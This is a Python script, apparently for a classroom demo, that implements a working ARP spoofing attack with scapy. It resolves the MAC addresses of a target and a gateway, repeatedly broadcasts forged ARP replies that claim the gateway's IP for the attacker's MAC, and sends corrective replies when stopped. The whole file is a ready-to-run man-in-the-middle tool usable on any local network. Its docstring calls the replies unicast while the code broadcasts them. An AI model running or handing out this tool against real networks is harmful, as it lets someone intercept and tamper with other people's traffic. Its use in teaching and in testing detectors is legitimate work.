#!/usr/bin/env python3
"""
Simple ARP spoofer for a classroom/demo project.
Sends unsolicited ARP replies (unicast, with proper L2 headers) telling the
target that the attacker's MAC is the gateway's IP. This is exactly what
`arpspoof` from dsniff does.

Usage:
    sudo python3 arpspoof.py <target_ip> <gateway_ip> [interface]

Example (use YOUR real network IPs from `arp -a`, NOT these placeholders):
    sudo python3 arpspoof.py 10.79.48.230 10.79.48.165 en1

Press Ctrl+C to stop. The script will send corrected ARP replies so the
target's ARP table heals quickly.
"""

import sys
import time
from scapy.all import ARP, Ether, sendp, srp, getmacbyip, conf, get_if_hwaddr

def resolve_mac(ip, iface):
    """Force ARP resolution by sending a broadcast request and waiting for reply."""
    mac = getmacbyip(ip)
    if mac:
        return mac
    # Fallback: send our own ARP request
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        iface=iface, timeout=2, verbose=0,
    )
    if ans:
        return ans[0][1].hwsrc
    return None

def main():
    if len(sys.argv) < 3:
        print("Usage: sudo python3 arpspoof.py <target_ip> <gateway_ip> [interface]")
        sys.exit(1)

    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    iface = sys.argv[3] if len(sys.argv) >= 4 else conf.iface
    conf.iface = iface

    try:
        attacker_mac = get_if_hwaddr(iface)
    except Exception as e:
        print(f"[!] Could not read MAC for interface {iface}: {e}")
        sys.exit(1)

    print(f"[*] Interface : {iface}")
    print(f"[*] Attacker  : (me) {attacker_mac}")

    print(f"[*] Resolving target {target_ip} ...")
    target_mac = resolve_mac(target_ip, iface)
    if not target_mac:
        print(f"[!] Could not resolve MAC for {target_ip}.")
        print(f"[!] Make sure {target_ip} is online and on the same network.")
        print(f"[!] Try `ping {target_ip}` from your Mac first, then re-run.")
        sys.exit(1)
    print(f"[+] Target    : {target_ip} -> {target_mac}")

    print(f"[*] Resolving gateway {gateway_ip} ...")
    gateway_mac = resolve_mac(gateway_ip, iface)
    if not gateway_mac:
        print(f"[!] Could not resolve MAC for gateway {gateway_ip}. Try pinging it first.")
        sys.exit(1)
    print(f"[+] Gateway   : {gateway_ip} -> {gateway_mac}")

    print(f"\n[*] Spoofing target {target_ip}: claiming I am the gateway {gateway_ip}")
    print("[*] Press Ctrl+C to stop.\n")

    # Build the poison packet.
    # IMPORTANT: L2 destination is BROADCAST (ff:ff:ff:ff:ff:ff) — this is what
    # real arpspoof / bettercap do. Two reasons:
    #   1. It still poisons the target (the ARP layer is addressed to them).
    #   2. Other hosts on the LAN see it, which is what the defense detector
    #      on a separate machine needs in order to capture and flag it.
    # If you unicast this to the target only, a switch/AP filters the frame
    # and the detector machine will be blind to the attack.
    poison_pkt = (
        Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff")
        / ARP(
            op=2,
            hwsrc=attacker_mac,   # I'm pretending this MAC is the gateway's
            psrc=gateway_ip,      # claiming to be the gateway IP
            hwdst=target_mac,     # ARP-level "destination" is still the target
            pdst=target_ip,
        )
    )

    sent = 0
    try:
        while True:
            sendp(poison_pkt, iface=iface, verbose=0)
            sent += 1
            print(f"\r[+] ARP poison packets sent: {sent}", end="", flush=True)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Stopping. Sending corrective ARP to heal target's table...")
        # Restore: tell target the gateway's REAL MAC (broadcast as well)
        restore_pkt = (
            Ether(src=gateway_mac, dst="ff:ff:ff:ff:ff:ff")
            / ARP(
                op=2,
                hwsrc=gateway_mac,
                psrc=gateway_ip,
                hwdst=target_mac,
                pdst=target_ip,
            )
        )
        sendp(restore_pkt, iface=iface, count=5, verbose=0)
        print("[+] Done.")

if __name__ == "__main__":
    main()
